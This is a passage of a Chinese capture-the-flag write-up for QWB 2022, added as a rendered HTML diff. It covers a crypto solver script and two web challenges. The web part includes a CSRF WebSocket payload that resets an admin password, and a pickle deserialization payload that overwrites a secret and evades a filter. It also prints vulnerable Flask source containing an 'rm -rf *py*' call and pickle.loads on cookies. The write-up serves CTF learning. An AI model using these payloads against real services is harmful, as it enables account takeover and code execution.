+<span class="line" data-line="35"><span style="color:#E1E4E8">io.sendafter(</span><span style="color:#9ECBFF">'Give me XXXX: '</span><span style="color:#E1E4E8">, proof(end,</span><span style="color:#79B8FF">SHA</span><span style="color:#E1E4E8">))</span></span>
+<span class="line" data-line="36"></span>
+<span class="line" data-line="37"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">40</span><span style="color:#E1E4E8">):</span></span>
+<span class="line" data-line="38"><span style="color:#E1E4E8">    io.recvuntil(</span><span style="color:#9ECBFF">'r(x) = '</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="39"><span style="color:#E1E4E8">    rx </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> poly(io.recvuntil(</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)[:</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">].decode())</span></span>
+<span class="line" data-line="40"><span style="color:#E1E4E8">    io.recvuntil(</span><span style="color:#9ECBFF">'a(x) = '</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="41"><span style="color:#E1E4E8">    ax </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> poly(io.recvuntil(</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)[:</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">].decode())</span></span>
+<span class="line" data-line="42"><span style="color:#E1E4E8">    io.recvuntil(</span><span style="color:#9ECBFF">'c(x) = '</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="43"><span style="color:#E1E4E8">    cx </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> poly(io.recvuntil(</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)[:</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">].decode())</span></span>
+<span class="line" data-line="44"><span style="color:#E1E4E8">    bx </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (rx</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">cx)</span><span style="color:#F97583">//</span><span style="color:#E1E4E8">ax</span></span>
+<span class="line" data-line="45"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(rx,ax,bx)</span></span>
+<span class="line" data-line="46"><span style="color:#E1E4E8">    io.sendafter(</span><span style="color:#9ECBFF">'> b(x) = '</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(bx))</span></span>
+<span class="line" data-line="47"><span style="color:#E1E4E8">io.recvall()</span></span></code></pre>
+<h2 id="web">Web</h2>
+<h3 id="babyweb">babyweb</h3>
+<p>随手注册一个账号登录后，根据提示发送 <code>help</code> ，返回如下信息</p>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220730185825254.png" alt="image-20220730185825254"></p>
+<p>一开始看到 <code>bugreport</code> 命令（发送 <code>bugreport 网址</code>  管理员会去请求你发送的网址），觉得应该是 <code>XSS</code> 钓管理员的 <code>cookie</code>，但是一直没成功，接收不到请求。</p>
+<p>后来考虑到利用 <code>bugreport</code> 和 <code>changepw</code> 功能构造 <code>csrf </code> 修改管理员密码 ，根据页面中的 <code>js</code> ，简单构造 <code>ws</code> 的请求，上传到自己的服务器， 试了半天还是不行，最后考虑到不出网，题目描述里给了 <code>docker</code> 容器映射的端口，所以脚本里的 <code>ws</code> 地址改为 <code>ws://127.0.0.1:8888</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line" data-line="1"><span style="color:#B392F0">docker</span><span style="color:#9ECBFF"> run</span><span style="color:#79B8FF"> -dit</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> "0.0.0.0:pub_port:8888"</span><span style="color:#9ECBFF"> babyweb</span></span></code></pre>
+<hr>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line" data-line="1"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">meta</span><span style="color:#B392F0"> charset</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"utf‐8"</span><span style="color:#E1E4E8"> /></span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">></span></span>
+<span class="line" data-line="3"><span style="color:#F97583">var</span><span style="color:#E1E4E8"> ws </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> null</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">var</span><span style="color:#E1E4E8"> url </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "ws://127.0.0.1:8888/bot"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="5"></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">ws </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> WebSocket</span><span style="color:#E1E4E8">(url);</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">ws.</span><span style="color:#B392F0">onopen</span><span style="color:#F97583"> =</span><span style="color:#F97583"> function</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">event</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">    var</span><span style="color:#E1E4E8"> msg </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "changepw 123456"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">    ws.</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(msg);</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">></span></span></code></pre>
+<p>在对话框里发送 <code>bugreport poc地址</code> ，然后 <code>admin</code>的密码就会被重置为 <code>123456</code>，重新登录 <code>admin</code> 账户</p>
+<p>购买 <code>Hint</code> 得到题目源码 <code> /static/qwb_source_12580.zip</code></p>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220730200411370.png" alt="image-20220730200411370"></p>
+<p>查看源码发现限制的很死，必须在定义的范围内、必须是数字之类的，最后考虑到 <code>python</code> 和 <code>go</code> 俩语言不同，<code>json</code> 解释器也不同，绕过了限制，参考文章 <a href="https://www.cnblogs.com/cdaniu/p/16042354.html">深入考察JSON在互操作性方面的安全漏洞</a></p>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220730200617452.png" alt="image-20220730200617452"></p>
+<p>返回页面得到flag</p>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220730200630203.png" alt="image-20220730200630203"></p>
+<h3 id="crash">crash</h3>
+<blockquote>
+<p>题目内容：flag in 504 page</p>
+</blockquote>
+<p>访问首页得到题目源代码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> base64</span></span>
+<span class="line" data-line="2"><span style="color:#6A737D"># import sqlite3</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> pickle</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">from</span><span style="color:#E1E4E8"> flask </span><span style="color:#F97583">import</span><span style="color:#E1E4E8"> Flask, make_response,request, session</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> admin</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> random</span></span>
+<span class="line" data-line="7"></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">app </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> Flask(</span><span style="color:#79B8FF">__name__</span><span style="color:#E1E4E8">,</span><span style="color:#FFAB70">static_url_path</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">app.secret_key</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">random.randbytes(</span><span style="color:#79B8FF">12</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="10"></span>
+<span class="line" data-line="11"><span style="color:#F97583">class</span><span style="color:#B392F0"> User</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="12"><span style="color:#F97583">    def</span><span style="color:#79B8FF"> __init__</span><span style="color:#E1E4E8">(self, username,password):</span></span>
+<span class="line" data-line="13"><span style="color:#79B8FF">        self</span><span style="color:#E1E4E8">.username</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">username</span></span>
+<span class="line" data-line="14"><span style="color:#79B8FF">        self</span><span style="color:#E1E4E8">.token</span><span style="color:#F97583">=</span><span style="color:#79B8FF">hash</span><span style="color:#E1E4E8">(password)</span></span>
+<span class="line" data-line="15"></span>
+<span class="line" data-line="16"><span style="color:#F97583">def</span><span style="color:#B392F0"> get_password</span><span style="color:#E1E4E8">(username):</span></span>
+<span class="line" data-line="17"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> username</span><span style="color:#F97583">==</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="18"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> admin.secret</span></span>
+<span class="line" data-line="19"><span style="color:#F97583">    else</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="20"><span style="color:#6A737D">        # conn=sqlite3.connect("user.db")</span></span>
+<span class="line" data-line="21"><span style="color:#6A737D">        # cursor=conn.cursor()</span></span>
+<span class="line" data-line="22"><span style="color:#6A737D">        # cursor.execute(f"select password from usertable where username='{username}'")</span></span>
+<span class="line" data-line="23"><span style="color:#6A737D">        # data=cursor.fetchall()[0]</span></span>
+<span class="line" data-line="24"><span style="color:#6A737D">        # if data:</span></span>
+<span class="line" data-line="25"><span style="color:#6A737D">        #     return data[0] </span></span>
+<span class="line" data-line="26"><span style="color:#6A737D">        # else:</span></span>
+<span class="line" data-line="27"><span style="color:#6A737D">        #     return None</span></span>
+<span class="line" data-line="28"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> session.get(</span><span style="color:#9ECBFF">"password"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="29"></span>
+<span class="line" data-line="30"><span style="color:#B392F0">@app.route</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/balancer'</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">methods</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">[</span><span style="color:#9ECBFF">'GET'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'POST'</span><span style="color:#E1E4E8">])</span></span>
+<span class="line" data-line="31"><span style="color:#F97583">def</span><span style="color:#B392F0"> flag</span><span style="color:#E1E4E8">():</span></span>
+<span class="line" data-line="32"><span style="color:#E1E4E8">    pickle_data</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">base64.b64decode(request.cookies.get(</span><span style="color:#9ECBFF">"userdata"</span><span style="color:#E1E4E8">))</span></span>
+<span class="line" data-line="33"><span style="color:#F97583">    if</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'R'</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> pickle_data </span><span style="color:#F97583">or</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">"secret"</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> pickle_data:</span></span>
+<span class="line" data-line="34"><span style="color:#F97583">        return</span><span style="color:#9ECBFF"> "You damm hacker!"</span></span>
+<span class="line" data-line="35"><span style="color:#E1E4E8">    os.system(</span><span style="color:#9ECBFF">"rm -rf *py*"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="36"><span style="color:#E1E4E8">    userdata</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">pickle.loads(pickle_data)</span></span>
+<span class="line" data-line="37"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> userdata.token</span><span style="color:#F97583">!=</span><span style="color:#79B8FF">hash</span><span style="color:#E1E4E8">(get_password(userdata.username)):</span></span>
+<span class="line" data-line="38"><span style="color:#F97583">         return</span><span style="color:#9ECBFF"> "Login First"</span></span>
+<span class="line" data-line="39"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> userdata.username</span><span style="color:#F97583">==</span><span style="color:#9ECBFF">'admin'</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="40"><span style="color:#F97583">        return</span><span style="color:#9ECBFF"> "Welcome admin, here is your next challenge!"</span></span>
+<span class="line" data-line="41"><span style="color:#F97583">    return</span><span style="color:#9ECBFF"> "You're not admin!"</span></span>
+<span class="line" data-line="42"></span>
+<span class="line" data-line="43"><span style="color:#B392F0">@app.route</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/login'</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">methods</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">[</span><span style="color:#9ECBFF">'GET'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'POST'</span><span style="color:#E1E4E8">])</span></span>
+<span class="line" data-line="44"><span style="color:#F97583">def</span><span style="color:#B392F0"> login</span><span style="color:#E1E4E8">():</span></span>
+<span class="line" data-line="45"><span style="color:#E1E4E8">    resp </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> make_response(</span><span style="color:#9ECBFF">"success"</span><span style="color:#E1E4E8">) </span></span>
+<span class="line" data-line="46"><span style="color:#E1E4E8">    session[</span><span style="color:#9ECBFF">"password"</span><span style="color:#E1E4E8">]</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">request.values.get(</span><span style="color:#9ECBFF">"password"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="47"><span style="color:#E1E4E8">    resp.set_cookie(</span><span style="color:#9ECBFF">"userdata"</span><span style="color:#E1E4E8">, base64.b64encode(pickle.dumps(User(request.values.get(</span><span style="color:#9ECBFF">"username"</span><span style="color:#E1E4E8">),request.values.get(</span><span style="color:#9ECBFF">"password"</span><span style="color:#E1E4E8">)),</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">)), </span><span style="color:#FFAB70">max_age</span><span style="color:#F97583">=</span><span style="color:#79B8FF">3600</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="48"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> resp</span></span>
+<span class="line" data-line="49"></span>
+<span class="line" data-line="50"><span style="color:#B392F0">@app.route</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/'</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">methods</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">[</span><span style="color:#9ECBFF">'GET'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'POST'</span><span style="color:#E1E4E8">])</span></span>
+<span class="line" data-line="51"><span style="color:#F97583">def</span><span style="color:#B392F0"> index</span><span style="color:#E1E4E8">():</span></span>
+<span class="line" data-line="52"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'source.txt'</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"r"</span><span style="color:#E1E4E8">).read()</span></span>
+<span class="line" data-line="53"></span>
+<span class="line" data-line="54"><span style="color:#F97583">if</span><span style="color:#79B8FF"> __name__</span><span style="color:#F97583"> ==</span><span style="color:#9ECBFF"> '__main__'</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="55"><span style="color:#E1E4E8">    app.run(</span><span style="color:#FFAB70">host</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'0.0.0.0'</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">port</span><span style="color:#F97583">=</span><span style="color:#79B8FF">5000</span><span style="color:#E1E4E8">)</span></span></code></pre>
+<p>登陆 <code>admin</code> ，用户名和密码通过 <code>GET</code> 传参。经过序列化操作和 <code>base64</code> 编码后放到 <code>cookie</code> 里</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">def</span><span style="color:#B392F0"> login</span><span style="color:#E1E4E8">():</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">    resp </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> make_response(</span><span style="color:#9ECBFF">"success"</span><span style="color:#E1E4E8">) </span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">    session[</span><span style="color:#9ECBFF">"password"</span><span style="color:#E1E4E8">]</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">request.values.get(</span><span style="color:#9ECBFF">"password"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">    resp.set_cookie(</span><span style="color:#9ECBFF">"userdata"</span><span style="color:#E1E4E8">, base64.b64encode(pickle.dumps(User(request.values.get(</span><span style="color:#9ECBFF">"username"</span><span style="color:#E1E4E8">),request.values.get(</span><span style="color:#9ECBFF">"password"</span><span style="color:#E1E4E8">)),</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">)), </span><span style="color:#FFAB70">max_age</span><span style="color:#F97583">=</span><span style="color:#79B8FF">3600</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> resp</span></span></code></pre>
+<p>我们发现 <code>admin</code> 的密码是本地变量 <code>secret</code> ，但是不知道 <code>secret</code> 的值是多少</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">def</span><span style="color:#B392F0"> get_password</span><span style="color:#E1E4E8">(username):</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> username</span><span style="color:#F97583">==</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> admin.secret</span></span></code></pre>
+<p>我们可以通过 <code>pickle</code> 反序列化实现 <code>变量覆盖</code> ，注意传入的序列化字符串中不能出现 <code>R</code> 和 <code>secret</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">if</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'R'</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> pickle_data </span><span style="color:#F97583">or</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">"secret"</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> pickle_data:</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">        return</span><span style="color:#9ECBFF"> "You damm hacker!"</span></span></code></pre>
+<p>我们使用双层 <code>exec</code> 绕过，另外推荐一篇 <a href="https://xz.aliyun.com/t/7436">pickle反序列化初探</a> 文章，写的很详细</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> base64</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">data </span><span style="color:#F97583">=</span><span style="color:#F97583"> b</span><span style="color:#9ECBFF">'''(S'exec('admin.se'+'cret="admin"')'</span></span>
+<span class="line" data-line="4"><span style="color:#9ECBFF">i__builtin__</span></span>
+<span class="line" data-line="5"><span style="color:#9ECBFF">exec</span></span>
+<span class="line" data-line="6"><span style="color:#9ECBFF">.'''</span></span>
+<span class="line" data-line="7"></span>
+<span class="line" data-line="8"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(base64.b64encode(data))</span></span>
+<span class="line" data-line="9"><span style="color:#6A737D"># KFMnZXhlYygnYWRtaW4uc2UnKydjcmV0PSJhZG1pbiInKScKaV9fYnVpbHRpbl9fCmV4ZWMKLg==</span></span></code></pre>
+<p>此时页面显示成功</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>http://39.107.237.149:25512/login?username=admin&#x26;password=admin</span></span></code></pre>
+<p>此时访问 <code>/balancer</code> 会提示 <code>You're not admin!</code>，我们修改一下 <code>cookie</code>再去请求<code>/balancer</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>userdata=KFMnZXhlYygnYWRtaW4uc2UnKydjcmV0PSJhZG1pbiInKScKaV9fYnVpbHRpbl9fCmV4ZWMKLg==</span></span></code></pre>
+<p>请求后页面提示 <code>500</code> ，重新请求一次即可返回正常页面。</p>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220731204257000.png" alt="image-20220731204257000"></p>
+<p>这里又提示 <code>flag in 504 page</code> ，所以说这个页面应该是最终得到能flag页面</p>
+<p>然后还给了一个 <code>/826fd2f86129b050875e4a70cb059908a7ed</code>  我们直接构造请求一下</p>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220731204345607.png" alt="image-20220731204345607"></p>
+<p>访问后得到一个 <code>nginx</code> 配置文件</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="nginx"><code><span class="line" data-line="1"><span style="color:#6A737D"># nginx.vh.default.conf  --  docker-openresty</span></span>
+<span class="line" data-line="2"><span style="color:#6A737D">#</span></span>
+<span class="line" data-line="3"><span style="color:#6A737D"># This file is installed to:</span></span>
+<span class="line" data-line="4"><span style="color:#6A737D">#   `/etc/nginx/conf.d/default.conf`</span></span>
+<span class="line" data-line="5"><span style="color:#6A737D">#</span></span>
+<span class="line" data-line="6"><span style="color:#6A737D"># It tracks the `server` section of the upstream OpenResty's `nginx.conf`.</span></span>
+<span class="line" data-line="7"><span style="color:#6A737D">#</span></span>
+<span class="line" data-line="8"><span style="color:#6A737D"># This config (and any other configs in `etc/nginx/conf.d/`) is loaded by</span></span>
+<span class="line" data-line="9"><span style="color:#6A737D"># default by the `include` directive in `/usr/local/openresty/nginx/conf/nginx.conf`.</span></span>
+<span class="line" data-line="10"><span style="color:#6A737D">#</span></span>
+<span class="line" data-line="11"><span style="color:#6A737D"># See https://github.com/openresty/docker-openresty/blob/master/README.md#nginx-config-files</span></span>
+<span class="line" data-line="12"><span style="color:#6A737D">#</span></span>
+<span class="line" data-line="13"><span style="color:#F97583">lua_package_path</span><span style="color:#9ECBFF"> "/lua-resty-balancer/lib/?.lua;;"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="14"><span style="color:#F97583">lua_package_cpath</span><span style="color:#9ECBFF"> "/lua-resty-balancer/?.so;;"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="15"></span>
+<span class="line" data-line="16"><span style="color:#F97583">server</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="17"><span style="color:#F97583">    listen </span><span style="color:#79B8FF">      8088</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="18"><span style="color:#F97583">    server_name </span><span style="color:#E1E4E8"> localhost;</span></span>
+<span class="line" data-line="19"></span>
+<span class="line" data-line="20"><span style="color:#6A737D">    #charset koi8-r;</span></span>
+<span class="line" data-line="21"><span style="color:#6A737D">    #access_log  /var/log/nginx/host.access.log  main;</span></span>
+<span class="line" data-line="22"></span>
+<span class="line" data-line="23"><span style="color:#F97583">    location</span><span style="color:#B392F0"> /gettestresult </span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="24"><span style="color:#F97583">            default_type </span><span style="color:#E1E4E8">text/html;</span></span>
+<span class="line" data-line="25"><span style="color:#F97583">            content_by_lua</span><span style="color:#E1E4E8"> '</span></span>
+<span class="line" data-line="26"><span style="color:#F97583">                local</span><span style="color:#E1E4E8"> resty_roundrobin </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> require</span><span style="color:#9ECBFF"> "resty.roundrobin"</span></span>
+<span class="line" data-line="27"><span style="color:#F97583">                local</span><span style="color:#E1E4E8"> server_list </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="28"><span style="color:#E1E4E8">                    [ngx.</span><span style="color:#B392F0">var</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">arg_server1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ngx.</span><span style="color:#B392F0">var</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">arg_weight1</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="29"><span style="color:#E1E4E8">                    [ngx.</span><span style="color:#B392F0">var</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">arg_server2</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ngx.</span><span style="color:#B392F0">var</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">arg_weight2</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="30"><span style="color:#E1E4E8">                    [ngx.</span><span style="color:#B392F0">var</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">arg_server3</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ngx.</span><span style="color:#B392F0">var</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">arg_weight3</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="31"><span style="color:#E1E4E8">                }</span></span>
+<span class="line" data-line="32"><span style="color:#F97583">                local</span><span style="color:#E1E4E8"> rr_up </span><span style="color:#F97583">=</span><span style="color:#B392F0"> resty_roundrobin</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">new</span><span style="color:#E1E4E8">(server_list)</span></span>
+<span class="line" data-line="33"><span style="color:#F97583">                for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">9</span><span style="color:#F97583"> do</span></span>
+<span class="line" data-line="34"><span style="color:#E1E4E8">                    ngx.</span><span style="color:#79B8FF">say</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Server seleted for request "</span><span style="color:#E1E4E8">,i,</span><span style="color:#9ECBFF">": &#x26;nbsp;&#x26;nbsp;&#x26;nbsp;&#x26;nbsp;" </span><span style="color:#E1E4E8">,</span><span style="color:#B392F0">rr_up</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">find</span><span style="color:#E1E4E8">(),</span><span style="color:#9ECBFF">"&#x3C;br>"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="35"><span style="color:#F97583">                end</span></span>
+<span class="line" data-line="36"><span style="color:#E1E4E8">            ';</span></span>
+<span class="line" data-line="37"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="38"></span>
+<span class="line" data-line="39"><span style="color:#6A737D">    #error_page  404              /404.html;</span></span>
+<span class="line" data-line="40"></span>
+<span class="line" data-line="41"><span style="color:#6A737D">    # redirect server error pages to the static page /50x.html</span></span>
+<span class="line" data-line="42"><span style="color:#6A737D">    #</span></span>
+<span class="line" data-line="43"></span>
+<span class="line" data-line="44"></span>
+<span class="line" data-line="45"><span style="color:#6A737D">    # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span></span>
+<span class="line" data-line="46"><span style="color:#6A737D">    #</span></span>
+<span class="line" data-line="47"><span style="color:#6A737D">    #location ~ \.php$ {</span></span>
+<span class="line" data-line="48"><span style="color:#6A737D">    #    proxy_pass   http://127.0.0.1;</span></span>
+<span class="line" data-line="49"><span style="color:#6A737D">    #}</span></span>
+<span class="line" data-line="50"></span>
+<span class="line" data-line="51"><span style="color:#6A737D">    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span></span>
+<span class="line" data-line="52"><span style="color:#6A737D">    #</span></span>
+<span class="line" data-line="53"><span style="color:#6A737D">    #location ~ \.php$ {</span></span>
+<span class="line" data-line="54"><span style="color:#6A737D">    #    root           /usr/local/openresty/nginx/html;</span></span>
+<span class="line" data-line="55"><span style="color:#6A737D">    #    fastcgi_pass   127.0.0.1:9000;</span></span>
+<span class="line" data-line="56"><span style="color:#6A737D">    #    fastcgi_index  index.php;</span></span>
+<span class="line" data-line="57"><span style="color:#6A737D">    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span></span>
+<span class="line" data-line="58"><span style="color:#6A737D">    #    include        fastcgi_params;</span></span>
+<span class="line" data-line="59"><span style="color:#6A737D">    #}</span></span>
+<span class="line" data-line="60"></span>
+<span class="line" data-line="61"><span style="color:#6A737D">    # deny access to .htaccess files, if Apache's document root</span></span>
+<span class="line" data-line="62"><span style="color:#6A737D">    # concurs with nginx's one</span></span>
+<span class="line" data-line="63"><span style="color:#6A737D">    #</span></span>
+<span class="line" data-line="64"><span style="color:#6A737D">    #location ~ /\.ht {</span></span>
